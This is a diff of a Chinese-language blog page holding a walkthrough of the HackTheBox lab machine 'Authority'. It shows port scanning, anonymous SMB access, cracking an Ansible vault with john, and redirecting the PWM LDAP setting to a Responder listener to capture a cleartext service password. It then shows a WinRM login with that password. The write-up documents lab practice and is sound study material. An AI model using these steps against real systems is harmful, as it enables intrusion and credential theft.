@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="HackTheBox">
-    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Authority 10.10.11.222                                                                                                              端口扫描80,445,8443,以及一些常见域端口：">
+    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Authority 10.10.11.222   端口扫描80,445,8443,以及一些常见域端口： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Authority - HackTheBox">
 <meta property="og:url" content="https://darkwing.moe/2023/07/17/Authority-HackTheBox/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Authority 10.10.11.222                                                                                                              端口扫描80,445,8443,以及一些常见域端口：">
+<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines&#x2F;Authority 10.10.11.222   端口扫描80,445,8443,以及一些常见域端口： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071701.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071703.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071702.jpg">
@@ -131,8 +131,15 @@
             </li>
         
             <li class="waves-block waves-effect">
+              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-coffee"></i>
+                Buy me a coffe
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link"></i>
+                <i class="icon icon-lg icon-link2"></i>
                 About
               </a>
             </li>
@@ -154,7 +161,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -221,66 +228,24 @@
 <li><a href="https://app.hackthebox.com/machines/Authority" target="_blank" rel="noopener">https://app.hackthebox.com/machines/Authority</a></li>
 <li>10.10.11.222</li>
 </ul>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071701.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071701.jpg" alt=""></p>
 <h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>80,445,8443,以及一些常见域端口：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.222</span></span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-17 13:40 CST</span><br><span class="line">Nmap scan report for 10.10.11.222</span><br><span class="line">Host is up (0.12s latency).</span><br><span class="line">Not shown: 987 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-17 09:41:16Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB</span><br><span class="line">| Not valid before: 2022-08-09T23:03:21</span><br><span class="line">|_Not valid after:  2024-08-09T23:13:21</span><br><span class="line">|_ssl-date: 2023-07-17T09:42:08+00:00; +4h00m00s from scanner time.</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB</span><br><span class="line">| Not valid before: 2022-08-09T23:03:21</span><br><span class="line">|_Not valid after:  2024-08-09T23:13:21</span><br><span class="line">|_ssl-date: 2023-07-17T09:42:06+00:00; +4h00m00s from scanner time.</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2023-07-17T09:42:08+00:00; +4h00m00s from scanner time.</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB</span><br><span class="line">| Not valid before: 2022-08-09T23:03:21</span><br><span class="line">|_Not valid after:  2024-08-09T23:13:21</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2023-07-17T09:42:06+00:00; +4h00m00s from scanner time.</span><br><span class="line">| ssl-cert: Subject:</span><br><span class="line">| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB</span><br><span class="line">| Not valid before: 2022-08-09T23:03:21</span><br><span class="line">|_Not valid after:  2024-08-09T23:13:21</span><br><span class="line">8443/tcp open  ssl/https-alt</span><br><span class="line">|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   FourOhFourRequest, GetRequest:</span><br><span class="line">|     HTTP/1.1 200</span><br><span class="line">|     Content-Type: text/html;charset=ISO-8859-1</span><br><span class="line">|     Content-Length: 82</span><br><span class="line">|     Date: Mon, 17 Jul 2023 09:41:22 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     &lt;html&gt;&lt;head&gt;&lt;meta http-equiv="refresh" content="0;URL='/pwm'"/&gt;&lt;/head&gt;&lt;/html&gt;</span><br><span class="line">|   HTTPOptions:</span><br><span class="line">|     HTTP/1.1 200</span><br><span class="line">|     Allow: GET, HEAD, POST, OPTIONS</span><br><span class="line">|     Content-Length: 0</span><br><span class="line">|     Date: Mon, 17 Jul 2023 09:41:22 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|   RTSPRequest:</span><br><span class="line">|     HTTP/1.1 400</span><br><span class="line">|     Content-Type: text/html;charset=utf-8</span><br><span class="line">|     Content-Language: en</span><br><span class="line">|     Content-Length: 1936</span><br><span class="line">|     Date: Mon, 17 Jul 2023 09:41:28 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     &lt;!doctype html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400</span><br><span class="line">|     Request&lt;/title&gt;&lt;style type="text/css"&gt;body &#123;font-family:Tahoma,Arial,sans-serif;&#125; h1, h2, h3, b &#123;color:white;background-color:#525D76;&#125; h1 &#123;font-size:22px;&#125; h2 &#123;font-size:16px;&#125; h3 &#123;font-size:14px;&#125; p &#123;font-size:12px;&#125; a &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400</span><br><span class="line">|_    Request&lt;/h1&gt;&lt;hr class="line" /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; Invalid character found in the HTTP protocol [RTSP&amp;#47;1.00x0d0x0a0x0d0x0a...]&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid</span><br><span class="line">| ssl-cert: Subject: commonName=172.16.2.118</span><br><span class="line">| Not valid before: 2023-07-15T06:48:09</span><br><span class="line">|_Not valid after:  2025-07-16T18:26:33</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port8443-TCP:V=7.94%T=SSL%I=7%D=7/17%Time=64B4D482%P=x86_64-apple-darwi</span><br><span class="line">SF:n22.4.0%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/</span><br><span class="line">SF:html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Mon,\x2017</span><br><span class="line">SF:\x20Jul\x202023\x2009:41:22\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\</span><br><span class="line">SF:n\n\n&lt;html&gt;&lt;head&gt;&lt;meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='/p</span><br><span class="line">SF:wm'\"/&gt;&lt;/head&gt;&lt;/html&gt;")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow</span><br><span class="line">SF::\x20GET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:</span><br><span class="line">SF:\x20Mon,\x2017\x20Jul\x202023\x2009:41:22\x20GMT\r\nConnection:\x20clos</span><br><span class="line">SF:e\r\n\r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Typ</span><br><span class="line">SF:e:\x20text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x2</span><br><span class="line">SF:0Mon,\x2017\x20Jul\x202023\x2009:41:22\x20GMT\r\nConnection:\x20close\r</span><br><span class="line">SF:\n\r\n\n\n\n\n\n&lt;html&gt;&lt;head&gt;&lt;meta\x20http-equiv=\"refresh\"\x20content=</span><br><span class="line">SF:\"0;URL='/pwm'\"/&gt;&lt;/head&gt;&lt;/html&gt;")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\</span><br><span class="line">SF:x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x2</span><br><span class="line">SF:0en\r\nContent-Length:\x201936\r\nDate:\x20Mon,\x2017\x20Jul\x202023\x2</span><br><span class="line">SF:009:41:28\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;&lt;html</span><br><span class="line">SF:\x20lang=\"en\"&gt;&lt;head&gt;&lt;title&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20B</span><br><span class="line">SF:ad\x20Request&lt;/title&gt;&lt;style\x20type=\"text/css\"&gt;body\x20&#123;font-family:T</span><br><span class="line">SF:ahoma,Arial,sans-serif;&#125;\x20h1,\x20h2,\x20h3,\x20b\x20&#123;color:white;back</span><br><span class="line">SF:ground-color:#525D76;&#125;\x20h1\x20&#123;font-size:22px;&#125;\x20h2\x20&#123;font-size:1</span><br><span class="line">SF:6px;&#125;\x20h3\x20&#123;font-size:14px;&#125;\x20p\x20&#123;font-size:12px;&#125;\x20a\x20&#123;col</span><br><span class="line">SF:or:black;&#125;\x20\.line\x20&#123;height:1px;background-color:#525D76;border:non</span><br><span class="line">SF:e;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Ba</span><br><span class="line">SF:d\x20Request&lt;/h1&gt;&lt;hr\x20class=\"line\"\x20/&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt;\x20Exception</span><br><span class="line">SF:\x20Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt;\x20Invalid\x20character\x20found\x20in\</span><br><span class="line">SF:x20the\x20HTTP\x20protocol\x20\[RTSP&amp;#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]&lt;/</span><br><span class="line">SF:p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt;\x20The\x20server\x20cannot\x20or\x20will\x20not</span><br><span class="line">SF:\x20process\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x</span><br><span class="line">SF:20perceived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malform</span><br><span class="line">SF:ed\x20request\x20syntax,\x20invalid\x20");</span><br><span class="line">Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m59s</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2023-07-17T09:41:58</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 107.39 seconds</span><br></pre></td></tr></table></figure>
 
 <h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>IIS默认页面：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071703.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071703.jpg" alt=""></p>
 <h2 id="8443"><a href="#8443" class="headerlink" title="8443"></a>8443</h2><p>自动跳转到pwm，当前是配置模式：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071702.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071702.jpg" alt=""></p>
 <h1 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h1><p>smb匿名访问：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ~/Tools/impacket/examples/smbclient.py miao@10.10.11.222 -no-pass</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071704.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071704.jpg" alt=""></p>
 <h2 id="Development"><a href="#Development" class="headerlink" title="Development"></a>Development</h2><p>翻共享目录，最终在ansible下面的pwm里得到一个yml文件：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> use Development</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ls</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> Ansible</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ls</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> PWM</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ls</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> defaults</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ls</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> get main.yml</span></span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071705.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071705.jpg" alt=""></p>
 <h2 id="main-yml"><a href="#main-yml" class="headerlink" title="main.yml"></a>main.yml</h2><p>是一个ansible的加密vault：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071706.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071706.jpg" alt=""></p>
 <h2 id="mail-yml-content"><a href="#mail-yml-content" class="headerlink" title="mail.yml content"></a>mail.yml content</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">pwm_run_dir:</span> <span class="string">"<span class="template-variable">&#123;&#123; lookup('env', 'PWD') &#125;&#125;</span>"</span></span><br><span class="line"></span><br><span class="line"><span class="attr">pwm_hostname:</span> <span class="string">authority.htb.corp</span></span><br><span class="line"><span class="attr">pwm_http_port:</span> <span class="string">"<span class="template-variable">&#123;&#123; http_port &#125;&#125;</span>"</span></span><br><span class="line"><span class="attr">pwm_https_port:</span> <span class="string">"<span class="template-variable">&#123;&#123; https_port &#125;&#125;</span>"</span></span><br><span class="line"><span class="attr">pwm_https_enable:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">pwm_require_ssl:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="attr">pwm_admin_login:</span> <span class="type">!vault</span> <span class="string">|</span></span><br><span class="line"><span class="string">          $ANSIBLE_VAULT;1.1;AES256</span></span><br><span class="line"><span class="string">          32666534386435366537653136663731633138616264323230383566333966346662313161326239</span></span><br><span class="line"><span class="string">          6134353663663462373265633832356663356239383039640a346431373431666433343434366139</span></span><br><span class="line"><span class="string">          35653634376333666234613466396534343030656165396464323564373334616262613439343033</span></span><br><span class="line"><span class="string">          6334326263326364380a653034313733326639323433626130343834663538326439636232306531</span></span><br><span class="line"><span class="string">          3438</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span><span class="attr">pwm_admin_password:</span> <span class="type">!vault</span> <span class="string">|</span></span><br><span class="line"><span class="string">          $ANSIBLE_VAULT;1.1;AES256</span></span><br><span class="line"><span class="string">          31356338343963323063373435363261323563393235633365356134616261666433393263373736</span></span><br><span class="line"><span class="string">          3335616263326464633832376261306131303337653964350a363663623132353136346631396662</span></span><br><span class="line"><span class="string">          38656432323830393339336231373637303535613636646561653637386634613862316638353530</span></span><br><span class="line"><span class="string">          3930356637306461350a316466663037303037653761323565343338653934646533663365363035</span></span><br><span class="line"><span class="string">          6531</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span><span class="attr">ldap_uri:</span> <span class="attr">ldap://127.0.0.1/</span></span><br><span class="line"><span class="attr">ldap_base_dn:</span> <span class="string">"DC=authority,DC=htb"</span></span><br><span class="line"><span class="attr">ldap_admin_password:</span> <span class="type">!vault</span> <span class="string">|</span></span><br><span class="line"><span class="string">          $ANSIBLE_VAULT;1.1;AES256</span></span><br><span class="line"><span class="string">          63303831303534303266356462373731393561313363313038376166336536666232626461653630</span></span><br><span class="line"><span class="string">          3437333035366235613437373733316635313530326639330a643034623530623439616136363563</span></span><br><span class="line"><span class="string">          34646237336164356438383034623462323531316333623135383134656263663266653938333334</span></span><br><span class="line"><span class="string">          3238343230333633350a646664396565633037333431626163306531336336326665316430613566</span></span><br><span class="line"><span class="string">          3764</span></span><br></pre></td></tr></table></figure>
 
 <h1 id="Ansbile"><a href="#Ansbile" class="headerlink" title="Ansbile"></a>Ansbile</h1><p>针对ansible vault加密，就是破解出vault的密码，再从vault中解出来存储的密码：</p>
@@ -292,168 +257,63 @@
 <p>去掉多余的换行，破解出vault密码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 /usr/share/john/ansible2john.py ./vault1.yml &gt; hash.txt</span><br><span class="line">sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br><span class="line"></span><br><span class="line">!@#$%^&amp;*         (vault1.yml)</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071707.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071707.jpg" alt=""></p>
 <p>然后从vault中解出密码,不想安装ansible的话可以直接用这个：</p>
 <ul>
 <li>ansible-vault · PyPI<br><a href="https://pypi.org/project/ansible-vault/" target="_blank" rel="noopener">https://pypi.org/project/ansible-vault/</a></li>
 </ul>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pip install ansible-vault</span><br><span class="line">python3 decrypt.py</span><br><span class="line"></span><br><span class="line">svc_pwm</span><br><span class="line">pWm_@dm!N_!23</span><br><span class="line">DevT3st@123</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071708.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071708.jpg" alt=""></p>
 <h1 id="PWM"><a href="#PWM" class="headerlink" title="PWM"></a>PWM</h1><p>得到的账号密码尝试去登录pwm，报错证书问题：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071709.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071709.jpg" alt=""></p>
 <h2 id="Configuration-Manager"><a href="#Configuration-Manager" class="headerlink" title="Configuration Manager"></a>Configuration Manager</h2><p>但可以登录进入Configuration Manager，可以下载配置和导入配置：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071710.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071710.jpg" alt=""></p>
 <p>下载查看配置文件，根据前面的报错信息，LDAP链接有问题，定位到settings里的ldap url：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071711.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071711.jpg" alt=""></p>
 <h2 id="Responder-ldap"><a href="#Responder-ldap" class="headerlink" title="Responder + ldap"></a>Responder + ldap</h2><p>那么可以尝试修改其中的链接来获取连接信息，开启responder，修改URL为ldap：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 Responder.py -i 10.10.14.8 -v</span><br><span class="line"></span><br><span class="line">ldap://10.10.14.8:389</span><br></pre></td></tr></table></figure>
 
 <p>导入配置,Responder中得到了ldap连接信息：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[LDAP] Cleartext Client   : 10.10.11.222</span><br><span class="line">[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb</span><br><span class="line">[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071712.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071712.jpg" alt=""></p>
 <h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>得到的svc_ldap用户账号密码登录：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.222 -u svc_ldap -p lDaP_1n_th3_cle4r!</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071713.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023071713.jpg" alt=""></p>
